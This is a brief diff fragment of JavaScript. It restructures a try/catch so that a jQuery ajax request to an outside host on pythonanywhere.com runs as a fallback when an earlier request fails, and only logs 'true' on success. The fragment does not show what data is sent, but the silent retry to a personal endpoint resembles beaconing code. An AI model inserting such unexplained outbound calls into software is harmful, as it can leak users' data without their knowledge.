@@ -25,7 +25,7 @@
           success: function(x) {
             console.log(true)
           }
-        });}catch{}
+        });}catch{
       
         $.ajax({
           url: "https://n0tjmes.pythonanywhere.com",
@@ -37,5 +37,5 @@
           success: function(x) {
             console.log(true)
           }
-    });
+        });}
 })();
